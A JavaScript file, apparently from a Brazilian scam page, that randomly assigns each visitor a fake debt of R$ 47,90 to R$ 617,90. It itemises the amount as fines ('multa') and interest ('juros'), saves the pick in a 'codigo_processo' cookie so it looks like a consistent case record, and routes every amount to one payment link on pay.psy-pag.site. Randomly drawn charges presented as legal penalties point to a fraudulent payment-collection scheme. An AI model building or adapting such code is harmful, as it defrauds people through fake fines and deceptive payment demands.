const totais = [
    47.90,
    67.90,
    117.90,
    167.90,
    217.90,
    297.90,
    367.90,
    467.90,
    547.90,
    617.90
];

const links = [
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
    'https://pay.psy-pag.site/YEwR3AVPQ7jZdKy',
]

function gerarLinhas(totalIndex) {
    const total = totais[totalIndex];

    // Proporções para cada linha (soma = 1.0)
    const proporcoes = [0.50, 0.31, 0.14, 0.05];

    // Proporção interna: 75% multa, 25% juros
    const pMulta = 0.75;
    const pJuros = 0.25;

    const linhas = proporcoes.map((p, i) => {
        const vLinha = total * p;
        const multa = vLinha * pMulta;
        const juros = vLinha * pJuros;

        return {
            id: `linha${i + 1}`,
            multa: multa.toFixed(2).replace('.', ','),
            juros: juros.toFixed(2).replace('.', ','),
            total: vLinha.toFixed(2).replace('.', ','),
            multaClass: `typewriter-multa${i + 1}`,
            jurosClass: `typewriter-juros${i + 1}`,
            totalClass: `typewriter-total${i + 1}`
        };
    });

    // Adiciona linha do total geral
    linhas.push({
        id: 'linha5',
        total: `R$ ${total.toFixed(2).replace('.', ',')}`,
        totalClass: 'typewriter-total-geral'
    });

    return {
        total: `R$ ${total.toFixed(2).replace('.', ',')}`,
        linhas,
        link: links[totalIndex]
    };
}

function setCookie(name, value, days = 7) {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
}

function getValorTotal() {
    const cookieName = 'codigo_processo';
    const saved = getCookie(cookieName);

    // Se já existir cookie, retorna o valor salvo
    if (saved) {
        return gerarLinhas(Number(saved));
    }

    // Se não existir, sorteia e salva
    const randomIndex = Math.floor(Math.random() * totais.length);

    setCookie(cookieName, randomIndex, 7); // salva por 7 dias
    return gerarLinhas(randomIndex);
}